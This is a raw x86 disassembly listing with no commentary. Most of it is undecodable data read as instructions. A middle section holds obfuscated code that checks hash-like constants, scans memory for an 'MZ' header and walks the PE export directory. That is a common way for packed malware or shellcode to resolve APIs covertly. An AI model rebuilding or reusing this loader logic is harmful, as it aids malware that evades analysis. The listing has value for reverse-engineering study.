  41df3d:	jbe    0x41dfa7
  41df3f:	mov    eax,esp
  41df41:	xor    dl,BYTE PTR [edx+0x61593e3f]
  41df47:	enter  0x6594,0x9f
  41df4b:	ins    DWORD PTR es:[edi],dx
  41df4c:	test   DWORD PTR [ebp-0x64],edi
  41df4f:	ret    0xfc9e
  41df52:	push   ecx
  41df53:	fst    DWORD PTR [edx-0x44]
  41df56:	mov    ah,0x89
  41df58:	sub    ebp,edx
  41df5a:	xchg   ebp,eax
  41df5b:	mov    dh,BYTE PTR [edi+ecx*1]
  41df5e:	js     0x41dfd4
  41df60:	mov    ds:0xb0515416,al
  41df65:	hlt    
  41df66:	stos   DWORD PTR es:[edi],eax
  41df67:	enter  0xd957,0xd0
  41df6b:	ror    ebp,1
  41df6d:	xchg   DWORD PTR [ecx+0x7dfe9ea2],esp
  41df73:	neg    BYTE PTR [ebp+0x4d]
  41df76:	out    dx,eax
  41df77:	ja     0x41df27
  41df79:	fidivr WORD PTR [edi]
  41df7b:	mov    eax,0x52ae42f7
  41df80:	xchg   ebx,eax
  41df81:	outs   dx,BYTE PTR ds:[esi]
  41df82:	rcl    BYTE PTR [ecx+0x19],1
  41df85:	mov    dl,0x4c
  41df87:	mov    cl,0x7e
  41df89:	add    esp,edx
  41df8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df8c:	sub    al,0x9b
  41df8e:	int    0xb3
  41df90:	cli    
  41df91:	mov    ecx,ecx
  41df93:	push   ds
  41df94:	jnp    0x41e014
  41df96:	daa    
  41df97:	test   al,0x2b
  41df99:	sbb    DWORD PTR [edi],ebx
  41df9b:	sub    edx,DWORD PTR [ebp-0x29d09ee1]
  41dfa1:	int3   
  41dfa2:	or     BYTE PTR [ecx+0x8],dl
  41dfa5:	adc    eax,0xa44d2748
  41dfaa:	ret    
  41dfab:	mov    eax,ds:0xa3dd8680
  41dfb0:	jp     0x41dfaa
  41dfb2:	adc    eax,0xbca4e97a
  41dfb7:	loop   0x41e006
  41dfb9:	cld    
  41dfba:	xchg   esi,eax
  41dfbb:	inc    esi
  41dfbc:	shr    BYTE PTR [edi-0x4cdd10ec],0xd0
  41dfc3:	daa    
  41dfc4:	hlt    
  41dfc5:	inc    edi
  41dfc6:	repz pop es
  41dfc8:	jae    0x41e010
  41dfca:	or     al,0x4e
  41dfcc:	pop    ecx
  41dfcd:	mov    al,0xd4
  41dfcf:	inc    esi
  41dfd0:	jne    0x41dfa9
  41dfd2:	cs loop 0x41e02c
  41dfd5:	movsx  edi,sp
  41dfd8:	and    BYTE PTR fs:[eax+0x1dc4abe3],dl
  41dfdf:	inc    ecx
  41dfe0:	push   edx
  41dfe1:	xor    ebp,DWORD PTR [esi]
  41dfe3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dfe4:	aam    0x2c
  41dfe6:	leave  
  41dfe7:	sub    ebp,DWORD PTR [edi+0x7]
  41dfea:	pop    esp
  41dfeb:	pop    edi
  41dfec:	jecxz  0x41e037
  41dfee:	repz dec esp
  41dff0:	pusha  
  41dff1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dff2:	xor    edx,DWORD PTR [ebp+0x69]
  41dff5:	sbb    al,0x66
  41dff7:	cmp    al,0x11
  41dff9:	rcl    BYTE PTR [ebp-0x262c7864],0x4e
  41e000:	cmc    
  41e001:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e002:	xor    dl,BYTE PTR [ecx]
  41e004:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e005:	cmp    cl,BYTE PTR [edx]
  41e007:	mov    dh,ah
  41e009:	and    bh,dl
  41e00b:	mov    BYTE PTR [ecx+0x3c],dh
  41e00e:	pop    edi
  41e00f:	(bad)  
  41e010:	iret   
  41e011:	or     DWORD PTR [edx-0x2],0xe3edbc9
  41e018:	lock clc 
  41e01a:	jno    0x41e008
  41e01c:	fidivr WORD PTR [esi]
  41e01e:	shr    DWORD PTR [edx],0x56
  41e021:	fisttp WORD PTR [ebx+0x3226d447]
  41e027:	jb     0x41e01d
  41e029:	sbb    eax,0x61b0687a
  41e02e:	pop    ebp
  41e02f:	into   
  41e030:	popa   
  41e031:	mov    ecx,0x71a378f8
  41e036:	mov    ah,0x4b
  41e038:	sti    
  41e039:	daa    
  41e03a:	mov    ecx,edx
  41e03c:	jns    0x41dfd7
  41e03e:	mov    ds:0x7e705772,al
  41e043:	(bad)  [edi+eiz*4]
  41e046:	jp     0x41e03d
  41e048:	mov    ebx,0x776c893a
  41e04d:	daa    
  41e04e:	jecxz  0x41e077
  41e050:	adc    DWORD PTR [esi],eax
  41e052:	mov    ecx,0x5fdccc7b
  41e057:	mov    esi,DWORD PTR [ebx+0x4a]
  41e05a:	mov    ds:0xa77cca44,al
  41e05f:	inc    ecx
  41e060:	dec    ebp
  41e061:	pop    ss
  41e062:	mov    esi,0x8a1b359c
  41e067:	sbb    dh,BYTE PTR [ebx]
  41e069:	or     eax,0x30ba3eaf
  41e06e:	add    dh,al
  41e070:	mov    al,ds:0xabeee6c
  41e075:	mov    edx,0x39c39a47
  41e07a:	outs   dx,BYTE PTR ds:[esi]
  41e07b:	pushf  
  41e07c:	xor    bh,BYTE PTR [edx+0x1c8353b6]
  41e082:	mov    ah,0x28
  41e084:	mov    edx,DWORD PTR [eax+0x18]
  41e087:	out    dx,al
  41e088:	dec    eax
  41e089:	sub    ebp,DWORD PTR [ecx+0x40dadad0]
  41e08f:	sbb    ah,ah
  41e091:	out    0x11,al
  41e093:	jno    0x41e0c4
  41e095:	adc    ebp,DWORD PTR [edi-0x28]
  41e098:	fidivr WORD PTR [ebp-0x4481160b]
  41e09e:	jge    0x41e113
  41e0a0:	mov    al,0x49
  41e0a2:	jmp    0x41e106
  41e0a4:	mov    ah,0x61
  41e0a6:	cmp    ah,ah
  41e0a8:	dec    esp
  41e0a9:	stos   DWORD PTR es:[edi],eax
  41e0aa:	int    0xd2
  41e0ac:	data16 stos BYTE PTR es:[edi],al
  41e0ae:	dec    esp
  41e0af:	test   edx,ecx
  41e0b1:	xlat   BYTE PTR ds:[ebx]
  41e0b2:	repnz add eax,0x5b9076fd
  41e0b8:	pop    eax
  41e0b9:	push   ds
  41e0ba:	cmp    eax,0x70941f91
  41e0bf:	mov    DWORD PTR ds:0x428e3f,0x1354
  41e0c9:	jne    0x41e100
  41e0cf:	cmp    esi,ebx
  41e0d1:	mov    DWORD PTR ds:0x428e7b,0x261b
  41e0db:	jne    0x41e100
  41e0e1:	push   ebx
  41e0e2:	mov    DWORD PTR ds:0x428e67,0x2b68
  41e0ec:	push   0x70941f97
  41e0f1:	mov    DWORD PTR ds:0x428e63,0x40d9
  41e0fb:	jmp    0x420786
  41e100:	mov    eax,ds:0x428eb7
  41e105:	mov    eax,DWORD PTR [ebp+0x18]
  41e108:	mov    esi,DWORD PTR [ebp+0x1c]
  41e10b:	cmp    eax,0x70941f97
  41e110:	mov    DWORD PTR ds:0x428ebb,0x3db6
  41e11a:	jne    0x41e147
  41e120:	cmp    esi,ebx
  41e122:	mov    DWORD PTR ds:0x428e5f,0x2bd8
  41e12c:	jne    0x41e147
  41e132:	push   ebx
  41e133:	mov    DWORD PTR ds:0x428e2b,0x15b3
  41e13d:	push   0x70941f95
  41e142:	jmp    0x420786
  41e147:	mov    DWORD PTR ds:0x428e73,0x7017
  41e151:	mov    eax,DWORD PTR [ebp+0x18]
  41e154:	mov    esi,DWORD PTR [ebp+0x1c]
  41e157:	mov    DWORD PTR ds:0x428e27,0x78f9
  41e161:	cmp    eax,0x70941f95
  41e166:	jne    0x41e19d
  41e16c:	mov    DWORD PTR ds:0x428ecf,0x6494
  41e176:	cmp    esi,ebx
  41e178:	jne    0x41e19d
  41e17e:	push   ebx
  41e17f:	mov    DWORD PTR ds:0x428ea3,0x58e0
  41e189:	push   0x70941f9b
  41e18e:	mov    DWORD PTR ds:0x428e3f,0x40d6
  41e198:	jmp    0x420786
  41e19d:	mov    DWORD PTR ds:0x428e93,edx
  41e1a3:	mov    eax,DWORD PTR [ebp+0x18]
  41e1a6:	mov    esi,DWORD PTR [ebp+0x1c]
  41e1a9:	mov    DWORD PTR ds:0x428e83,0x6338
  41e1b3:	cmp    eax,0x70941f9b
  41e1b8:	mov    DWORD PTR ds:0x428e53,0x174c
  41e1c2:	jne    0x41e203
  41e1c8:	mov    DWORD PTR ds:0x428e67,0x61b3
  41e1d2:	cmp    esi,ebx
  41e1d4:	mov    DWORD PTR ds:0x428e4b,0x6bb8
  41e1de:	jne    0x41e203
  41e1e4:	mov    DWORD PTR ds:0x428e2b,0x777c
  41e1ee:	push   ebx
  41e1ef:	push   0x70941f99
  41e1f4:	mov    DWORD PTR ds:0x428eb7,0x6b5e
  41e1fe:	jmp    0x420786
  41e203:	mov    eax,DWORD PTR [ebp+0x18]
  41e206:	not    edi
  41e208:	mov    esi,DWORD PTR [ebp+0x1c]
  41e20b:	mov    edi,0x70941f9d
  41e210:	cmp    eax,edi
  41e212:	jne    0x420747
  41e218:	cmp    esi,ebx
  41e21a:	jne    0x420747
  41e220:	mov    eax,DWORD PTR [ebp+0x10]
  41e223:	xor    eax,ecx
  41e225:	add    eax,edx
  41e227:	mov    DWORD PTR [ebp-0x20],eax
  41e22a:	mov    eax,DWORD PTR [ebp+0xc]
  41e22d:	mov    esi,DWORD PTR [ebp-0x8]
  41e230:	xor    eax,ecx
  41e232:	add    eax,edx
  41e234:	imul   eax,DWORD PTR [esi]
  41e237:	mov    esi,DWORD PTR [ebp+0x8]
  41e23a:	xor    esi,ecx
  41e23c:	add    esi,edx
  41e23e:	cmp    esi,eax
  41e240:	mov    eax,DWORD PTR [ebp-0x4]
  41e243:	mov    edi,0xffcd8d0a
  41e248:	je     0x41e267
  41e24e:	mov    esi,DWORD PTR [ebp-0x20]
  41e251:	add    DWORD PTR [eax],esi
  41e253:	mov    eax,DWORD PTR [ebp-0x4]
  41e256:	mov    esi,DWORD PTR [ebp+0xc]
  41e259:	xor    esi,ecx
  41e25b:	add    esi,edx
  41e25d:	imul   esi,DWORD PTR [eax]
  41e260:	mov    DWORD PTR [eax],esi
  41e262:	jmp    0x41e26c
  41e267:	mov    esi,DWORD PTR [ebp+0x14]
  41e26a:	xor    DWORD PTR [eax],esi
  41e26c:	mov    eax,DWORD PTR [ebp-0x4]
  41e26f:	mov    esi,DWORD PTR [ebp+0x10]
  41e272:	xor    esi,ecx
  41e274:	sub    edi,esi
  41e276:	add    DWORD PTR [eax],edi
  41e278:	mov    eax,DWORD PTR [ebp-0x4]
  41e27b:	mov    esi,DWORD PTR [ebp-0x8]
  41e27e:	add    esi,DWORD PTR [eax]
  41e280:	mov    DWORD PTR [ebp-0x8],esi
  41e283:	mov    eax,DWORD PTR [ebp+0xc]
  41e286:	mov    esi,DWORD PTR [ebp+0xc]
  41e289:	xor    esi,ecx
  41e28b:	xor    eax,ecx
  41e28d:	lea    eax,[eax+esi*1+0x64e5ec]
  41e294:	mov    esi,DWORD PTR [ebp+0xc]
  41e297:	xor    esi,ecx
  41e299:	add    esi,edx
  41e29b:	imul   eax,esi
  41e29e:	mov    esi,DWORD PTR [ebp+0xc]
  41e2a1:	xor    esi,ecx
  41e2a3:	sub    esi,eax
  41e2a5:	mov    eax,DWORD PTR [ebp-0x4]
  41e2a8:	add    esi,edx
  41e2aa:	cmp    DWORD PTR [eax],esi
  41e2ac:	mov    eax,DWORD PTR [ebp-0x4]
  41e2af:	mov    esi,DWORD PTR [ebp+0x10]
  41e2b2:	jg     0x41e2c8
  41e2b8:	xor    esi,ecx
  41e2ba:	mov    edi,0xffcd8d0a
  41e2bf:	sub    edi,esi
  41e2c1:	add    DWORD PTR [eax],edi
  41e2c3:	jmp    0x41e2ce
  41e2c8:	xor    esi,ecx
  41e2ca:	add    esi,edx
  41e2cc:	add    DWORD PTR [eax],esi
  41e2ce:	mov    eax,DWORD PTR [ebp-0x8]
  41e2d1:	mov    esi,DWORD PTR [ebp-0x10]
  41e2d4:	mov    eax,DWORD PTR [eax]
  41e2d6:	xor    esi,ecx
  41e2d8:	add    esi,0x3272f5
  41e2de:	mov    DWORD PTR [ebp-0x28],0x7097b85c
  41e2e5:	mov    DWORD PTR [ebp-0x24],ebx
  41e2e8:	not    esi
  41e2ea:	mov    DWORD PTR [ebp-0x30],0x7097a55e
  41e2f1:	mov    DWORD PTR [ebp-0x2c],ebx
  41e2f4:	mov    ebx,DWORD PTR [ebp-0x28]
  41e2f7:	mov    edi,DWORD PTR [ebp-0x24]
  41e2fa:	and    eax,esi
  41e2fc:	mov    esi,0xa143
  41e301:	xor    bx,si
  41e304:	mov    esi,0x412e
  41e309:	add    bx,si
  41e30c:	cmp    WORD PTR [eax],bx
  41e30f:	je     0x41e359
  41e315:	mov    edi,DWORD PTR [ebp-0x10]
  41e318:	xor    edi,ecx
  41e31a:	mov    DWORD PTR [ebp-0x28],0x7097b85c
  41e321:	mov    DWORD PTR [ebp-0x24],0xffffffff
  41e328:	mov    ebx,0xffcd8d0a
  41e32d:	sub    ebx,edi
  41e32f:	mov    DWORD PTR [ebp-0x30],0x7097a55e
  41e336:	add    eax,ebx
  41e338:	mov    DWORD PTR [ebp-0x2c],0xffffffff
  41e33f:	mov    edi,DWORD PTR [ebp-0x28]
  41e342:	mov    ebx,DWORD PTR [ebp-0x24]
  41e345:	mov    ebx,0xa143
  41e34a:	xor    di,bx
  41e34d:	add    di,si
  41e350:	cmp    WORD PTR [eax],di
  41e353:	jne    0x41e315
  41e359:	mov    edi,DWORD PTR [ebp-0x14]
  41e35c:	mov    edi,DWORD PTR [edi]
  41e35e:	mov    ebx,DWORD PTR [eax+0x3c]
  41e361:	lea    edi,[ebx+edi*8+0x78]
  41e365:	mov    edi,DWORD PTR [edi+eax*1]
  41e368:	mov    DWORD PTR [ebp-0x18],edi
  41e36b:	mov    edi,DWORD PTR [ebp+0x8]
  41e36e:	xor    edi,ecx
  41e370:	add    edi,edx
  41e372:	jmp    0x4206eb
  41e377:	push   esi
  41e378:	inc    eax
  41e379:	dec    ebp
  41e37a:	test   DWORD PTR ds:0xe2b09684,eax
  41e380:	(bad)  [ebx]
  41e382:	data16 xlat BYTE PTR ds:[ebx]
  41e384:	jmp    0x8382:0xdacb812f
  41e38b:	daa    
  41e38c:	pusha  
  41e38d:	add    DWORD PTR [ebx+0x1ec3cba3],0x1f
  41e394:	call   DWORD PTR [edi-0x70]
  41e397:	loop   0x41e3bd
  41e399:	jle    0x41e3c4
  41e39b:	inc    ecx
  41e39c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e39d:	pop    ebx
  41e39e:	or     DWORD PTR [ebx-0x72],edi
  41e3a1:	inc    ebp
  41e3a2:	xchg   esp,eax
  41e3a3:	cmp    bl,bh
  41e3a5:	push   es
  41e3a6:	in     eax,dx
  41e3a7:	fld    TBYTE PTR [edi]
  41e3a9:	icebp  
  41e3aa:	fs or  eax,0xf4309806
  41e3b0:	inc    edx
  41e3b1:	mov    eax,ds:0x5800d9da
  41e3b6:	popf   
  41e3b7:	cmp    eax,ebx
  41e3b9:	data16 int3 
  41e3bb:	add    DWORD PTR [ebx-0x2bfa459b],0xd3dcd05a
  41e3c5:	xchg   edx,eax
  41e3c6:	loopne 0x41e429
  41e3c8:	fbstp  TBYTE PTR [edx-0x49a328fd]
  41e3ce:	cwde   
  41e3cf:	jno    0x41e3f3
  41e3d1:	xor    al,0xa3
  41e3d3:	ror    BYTE PTR [edi-0x47],cl
  41e3d6:	lods   eax,DWORD PTR ds:[esi]
  41e3d7:	sar    BYTE PTR [ecx+eiz*1],1
  41e3da:	pop    ebp
  41e3db:	(bad)  [esi-0x77a18a0c]
  41e3e1:	mov    ebp,0xc330ac44
  41e3e6:	ins    BYTE PTR es:[edi],dx
  41e3e7:	adc    BYTE PTR [eax],0xbb
  41e3ea:	(bad)  [edi+0x69]
  41e3ed:	mov    dl,0x87
  41e3ef:	stos   BYTE PTR es:[edi],al
  41e3f0:	and    bl,dl
  41e3f2:	jmp    0x6f82:0xc7305e53
  41e3f9:	sub    al,0x36
  41e3fb:	inc    esi
  41e3fc:	sub    DWORD PTR [ebp-0x29],ebx
  41e3ff:	push   eax
  41e400:	jno    0x41e3b8
  41e402:	es pop es
  41e404:	lods   al,BYTE PTR ds:[esi]
  41e405:	push   ds
  41e406:	mov    ch,0x77
  41e408:	push   cs
  41e409:	lods   eax,DWORD PTR ds:[esi]
  41e40a:	loopne 0x41e448
  41e40c:	sub    DWORD PTR [edi+edi*4],0xffffffc3
  41e410:	or     BYTE PTR [ecx-0x1a538d38],cl
  41e416:	add    dl,BYTE PTR ds:0x181c84ae
  41e41c:	mov    al,BYTE PTR [esi]
  41e41e:	out    dx,al
  41e41f:	and    bh,cl
  41e421:	xchg   esp,eax
  41e422:	push   es
  41e423:	sbb    bh,al
  41e425:	xor    edx,DWORD PTR [edi-0x21f61b33]
  41e42b:	arpl   WORD PTR [esi+0x18],di
  41e42e:	jno    0x41e461
  41e430:	icebp  
  41e431:	jo     0x41e3bb
  41e433:	popa   
  41e434:	cwde   
  41e435:	mov    ebx,0x652cd44c
  41e43a:	sub    al,0x20
  41e43c:	adc    DWORD PTR [eax+0x31],eax
  41e43f:	mov    eax,ds:0x21324243
  41e444:	mov    al,ds:0x4bc5064c
  41e449:	mov    ebp,0xf76704a9
  41e44e:	int3   
  41e44f:	repz mov edx,0xdcd340cf
  41e455:	jo     0x41e4cb
  41e457:	cwde   
  41e458:	ja     0x41e4d4
  41e45a:	int3   
  41e45b:	jmp    0x41e4bd
  41e45d:	mov    eax,0x8b25e3d6
  41e462:	ret    0x61b0
  41e465:	mov    dl,0x54
  41e467:	xchg   ecx,eax
  41e468:	jne    0x41e494
  41e46a:	cmp    DWORD PTR [ecx+0xf972f01],0x37
  41e471:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e472:	add    dl,BYTE PTR [eax]
  41e474:	sub    ecx,DWORD PTR [ebx-0x63eeeccf]
  41e47a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e47b:	jnp    0x41e438
  41e47d:	inc    ebp
  41e47e:	pop    edx
  41e47f:	not    DWORD PTR [esi+0x3176ae5b]
  41e485:	jns    0x41e501
  41e487:	pop    edx
  41e488:	push   esp
  41e489:	rcr    BYTE PTR [esi],0x9c
  41e48c:	int    0x17
  41e48e:	call   0x361c6edd
  41e493:	ss into 
  41e495:	test   DWORD PTR [esi+edi*4+0xfcaca33],ebx
  41e49c:	add    eax,0xb07e6e71
  41e4a1:	sub    ebp,edi
  41e4a3:	add    dh,BYTE PTR [edi]
  41e4a5:	sbb    ebp,edx
  41e4a7:	inc    esp
  41e4a8:	pop    ds
  41e4a9:	cmp    al,0x4c
  41e4ab:	fbstp  TBYTE PTR [eax-0x2ff9e9e8]
  41e4b1:	xchg   edx,eax
  41e4b2:	ins    BYTE PTR es:[edi],dx
  41e4b3:	(bad)  
  41e4b4:	and    bl,0x96
  41e4b7:	in     al,dx
  41e4b8:	cmc    
  41e4b9:	hlt    
  41e4ba:	hlt    
  41e4bb:	dec    esi
  41e4bc:	retf   
  41e4bd:	sbb    al,BYTE PTR [edx-0x12]
  41e4c0:	jnp    0x41e4d6
  41e4c2:	mov    ah,BYTE PTR [ebp+eax*1+0xc]
  41e4c6:	inc    edi
  41e4c7:	dec    ecx
  41e4c8:	(bad)  
  41e4c9:	lds    ebx,FWORD PTR [ecx+ecx*8+0x49]
  41e4cd:	pop    esp
  41e4ce:	mov    dl,0xe6
  41e4d0:	jp     0x41e512
  41e4d2:	mov    ecx,0xc6693176
  41e4d7:	dec    eax
  41e4d8:	cdq    
  41e4d9:	push   edi
  41e4da:	mov    al,BYTE PTR [eax]
  41e4dc:	scas   al,BYTE PTR es:[edi]
  41e4dd:	sub    al,0x1a
  41e4df:	lds    edi,FWORD PTR [edi+ebp*1-0x31911989]
  41e4e6:	aam    0x0
  41e4e8:	sbb    ebp,DWORD PTR [ebp+0x3f82ba29]
  41e4ee:	(bad)  
  41e4ef:	mov    eax,0x39aeb1a
  41e4f4:	dec    esi
  41e4f5:	lahf   
  41e4f6:	push   cs
  41e4f7:	cld    
  41e4f8:	inc    esp
  41e4f9:	pop    ebx
  41e4fa:	xchg   BYTE PTR [edi+edx*8],ah
  41e4fd:	enter  0x1682,0xec
  41e501:	arpl   sp,si
  41e503:	imul   esi,ebx,0x60c0a1ed
  41e509:	inc    ebx
  41e50a:	push   cs
  41e50b:	sti    
  41e50c:	or     eax,0xb0eb7d0b
  41e511:	mov    eax,0x5b0e7585
  41e516:	sub    al,0x6c
  41e518:	mov    bl,0xb4
  41e51a:	imul   esp,DWORD PTR gs:[ebx],0x5e5babd3
  41e521:	sub    eax,0xc0354e7a
  41e526:	mov    al,0xcf
  41e528:	into   
  41e529:	repnz sahf 
  41e52b:	push   ss
  41e52c:	call   0xb299:0x65c3280
  41e533:	push   0x72794cd0
  41e538:	lods   al,BYTE PTR ds:[esi]
  41e539:	mov    eax,ds:0xe547318d
  41e53e:	or     eax,0xa432ea1c
  41e543:	inc    esi
  41e544:	push   es
  41e545:	sbb    eax,0x562b2ecb
  41e54a:	retf   0x6675
  41e54d:	dec    edx
  41e54e:	and    ah,al
  41e550:	cmp    DWORD PTR [eax-0x35065893],eax
  41e556:	and    eax,0x6f0c71c3
  41e55b:	mov    cl,0x27
  41e55d:	fisub  DWORD PTR [ecx+eiz*4-0x65]
  41e561:	cmp    BYTE PTR [ecx+edx*1-0x5f],al
  41e565:	retf   
  41e566:	dec    ebx
  41e567:	test   eax,0x6e4c8484
  41e56c:	and    eax,0xfdeec245
  41e571:	pop    ebx
  41e572:	mov    DWORD PTR [ebp-0x1d],ecx
  41e575:	cmp    ax,0xd139
  41e579:	hlt    
  41e57a:	jne    0x41e570
  41e57c:	mov    dh,bl
  41e57e:	in     eax,0xe
  41e580:	sbb    esp,eax
  41e582:	out    0x9e,al
  41e584:	and    eax,0x4f99f32c
  41e589:	mov    edi,0x51d44400
  41e58e:	xchg   edx,eax
  41e58f:	lods   eax,DWORD PTR ds:[esi]
  41e591:	fmul   DWORD PTR [esi-0x55210327]
  41e597:	sbb    BYTE PTR [esi-0x11],bl
  41e59a:	cmp    DWORD PTR [eax-0x6adfc6f2],edx
  41e5a0:	popa   
  41e5a1:	ss pop ds
  41e5a3:	sub    eax,0x53be85ce
  41e5a8:	push   0x327247c9
  41e5ad:	mov    edx,0x471e6d49
  41e5b2:	(bad)  
  41e5b3:	ds cs adc eax,0xa51f2f07
  41e5ba:	cwde   
  41e5bb:	(bad)  
  41e5bc:	jb     0x41e5a1
  41e5be:	scas   eax,DWORD PTR es:[edi]
  41e5bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5c0:	dec    eax
  41e5c1:	inc    edx
  41e5c2:	cmp    BYTE PTR [edx],0xe2
  41e5c5:	sti    
  41e5c6:	stos   BYTE PTR es:[edi],al
  41e5c7:	imul   esi,ebp,0x60
  41e5ca:	jl     0x41e563
  41e5cc:	and    al,0x82
  41e5ce:	dec    esp
  41e5cf:	jge    0x41e5bc
  41e5d1:	into   
  41e5d2:	sub    al,0x87
  41e5d4:	pop    ds
  41e5d5:	inc    ebx
  41e5d6:	and    DWORD PTR [edx],esi
  41e5d8:	rcl    BYTE PTR [ebp+0xc],1
  41e5db:	cmp    DWORD PTR [edx-0xf],ecx
  41e5de:	push   0x16f1f856
  41e5e3:	js     0x41e5bf
  41e5e5:	js     0x41e594
  41e5e7:	ja     0x41e638
  41e5e9:	push   ebp
  41e5ea:	mov    esi,es
  41e5ec:	js     0x41e661
  41e5ee:	and    al,0x72
  41e5f0:	out    0xf8,al
  41e5f2:	mov    ecx,gs
  41e5f4:	shl    BYTE PTR [edx-0x5],1
  41e5f7:	jb     0x41e60e
  41e5f9:	pop    esi
  41e5fa:	pop    edi
  41e5fb:	pushf  
  41e5fc:	push   edi
  41e5fd:	call   0x1e327884
  41e602:	push   0xffffffcb
  41e604:	hlt    
  41e605:	fst    DWORD PTR [ebp+ecx*8+0x1b14ec93]
  41e60c:	fwait
  41e60d:	data16 jb 0x41e5e7
  41e610:	jnp    0x41e661
  41e612:	cmp    ah,dh
  41e614:	push   edi
  41e615:	sub    eax,0x43e81987
  41e61a:	pop    esi
  41e61b:	mov    al,0x89
  41e61d:	adc    eax,0xb50ec8ae
  41e622:	xchg   ebp,eax
  41e623:	test   eax,0x4ad4144a
  41e628:	das    
  41e629:	ds inc edi
  41e62b:	inc    eax
  41e62c:	jno    0x41e5be
  41e62e:	sub    DWORD PTR [esi],edx
  41e630:	ins    BYTE PTR es:[edi],dx
  41e631:	mov    dl,0xe8
  41e633:	das    
  41e634:	sbb    bh,dl
  41e636:	push   esp
  41e637:	in     eax,dx
  41e638:	xor    DWORD PTR [ecx-0xe6e161],ebp
  41e63e:	jmp    0xa84d6e12
  41e643:	jge    0x41e66f
  41e645:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e646:	inc    ecx
  41e647:	mov    edx,0xdf656344
  41e64c:	xlat   BYTE PTR ds:[ebx]
  41e64d:	pusha  
  41e64e:	inc    esp
  41e64f:	stos   DWORD PTR es:[edi],eax
  41e650:	std    
  41e651:	(bad)  
  41e652:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e653:	cld    
  41e654:	jg     0x41e60b
  41e656:	push   esp
  41e657:	mov    edi,0x93aca991
  41e65c:	xchg   ecx,eax
  41e65d:	iret   
  41e65e:	int3   
  41e65f:	test   eax,0x18153521
  41e664:	push   ebx
  41e665:	iret   
  41e666:	aad    0x34
  41e668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e669:	les    esi,FWORD PTR [ebx-0x3c]
  41e66c:	cmc    
  41e66d:	adc    al,0xc8
  41e66f:	inc    esi
  41e670:	lock inc ecx
  41e672:	in     eax,0xe6
  41e674:	push   0xffffff92
  41e676:	pop    esi
  41e677:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e678:	push   esi
  41e679:	dec    esi
  41e67a:	sub    edx,ebp
  41e67c:	inc    esi
  41e67d:	jg     0x41e6aa
  41e67f:	mov    ah,0xab
  41e681:	mov    DWORD PTR [eax],eax
  41e683:	mov    esi,DWORD PTR [edx-0x5164667f]
  41e689:	jecxz  0x41e6ab
  41e68b:	rcl    DWORD PTR [esp+edi*1],0x10
  41e68f:	push   edi
  41e690:	rcr    cl,0x95
  41e693:	test   eax,0x403b2681
  41e698:	cli    
  41e699:	and    esp,edx
  41e69b:	add    DWORD PTR [eax+0x239d2460],ebx
  41e6a1:	jne    0x41e6de
  41e6a3:	mov    ah,0xca
  41e6a5:	jno    0x41e67e
  41e6a7:	js     0x41e69b
  41e6a9:	and    al,0xb
  41e6ab:	stos   DWORD PTR es:[edi],eax
  41e6ac:	sti    
  41e6ad:	add    DWORD PTR [ebp+0x30a34478],edi
  41e6b3:	fbstp  TBYTE PTR [edx]
  41e6b5:	mov    ds:0x67786e21,al
  41e6ba:	fnstenv [edx]
  41e6bc:	test   DWORD PTR [ebx+ecx*4-0x5a41c665],esp
  41e6c3:	and    DWORD PTR [ecx+ecx*1],edx
  41e6c6:	icebp  
  41e6c7:	cdq    
  41e6c8:	data16 add BYTE PTR [eax-0x72f65b06],dh
  41e6cf:	cmp    DWORD PTR [esi-0x239835a7],0x4c3a47bc
  41e6d9:	jae    0x41e67d
  41e6db:	adc    eax,0xbaa7ff3f
  41e6e0:	adc    esi,DWORD PTR [esi+0x6a]
  41e6e3:	hlt    
  41e6e4:	jle    0x41e670
  41e6e6:	pop    ebp
  41e6e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6e8:	mov    ebp,0xf5f2a5d2
  41e6ed:	pop    ebp
  41e6ee:	gs xchg edx,eax
  41e6f0:	adc    al,0x24
  41e6f2:	and    DWORD PTR [esp+edi*2+0x786b6d9e],eax
  41e6f9:	test   al,0x93
  41e6fb:	stos   DWORD PTR es:[edi],eax
  41e6fc:	vhsubpd ymm1,ymm6,ymm0
  41e700:	cmp    BYTE PTR [ecx],al
  41e702:	aas    
  41e703:	xlat   BYTE PTR ds:[ebx]
  41e704:	mov    dh,0x2a
  41e706:	and    bh,BYTE PTR [esi-0xc]
  41e709:	sub    al,0xaf
  41e70b:	pop    edx
  41e70c:	xor    eax,0xb067a29c
  41e711:	mov    ss,WORD PTR [edx]
  41e713:	fwait
  41e714:	outs   dx,BYTE PTR ds:[esi]
  41e715:	mov    ebx,0x306559b0
  41e71a:	mov    eax,0x1683da01
  41e71f:	sbb    al,0xdd
  41e721:	add    al,0x81
  41e723:	and    BYTE PTR [edx+0x34],ah
  41e726:	cmp    BYTE PTR [ebp-0x308292d9],al
  41e72c:	and    bh,BYTE PTR [ebx+0x1490d24a]
  41e732:	(bad)  
  41e733:	test   BYTE PTR [esi],bh
  41e735:	dec    edi
  41e736:	les    ebx,FWORD PTR [esi]
  41e738:	xchg   BYTE PTR gs:[eax],dh
  41e73b:	jmp    0x41e762
  41e73d:	add    cl,BYTE PTR [eax+eax*2-0x9efab55]
  41e744:	leave  
  41e745:	clc    
  41e746:	mov    ds,WORD PTR [eax-0x6d37a6df]
  41e74c:	cld    
  41e74d:	sar    DWORD PTR [ebx+0x6aa6e5c4],1
  41e753:	and    al,0x9c
  41e755:	imul   ebp,DWORD PTR [esi-0x51],0x42fae38e
  41e75c:	sub    DWORD PTR [ecx],0x75
  41e75f:	je     0x41e704
  41e761:	add    DWORD PTR [esi+edi*1+0x3],eax
  41e765:	pop    ebx
  41e766:	rcl    DWORD PTR [edx],1
  41e768:	out    dx,al
  41e769:	mov    cl,0xf
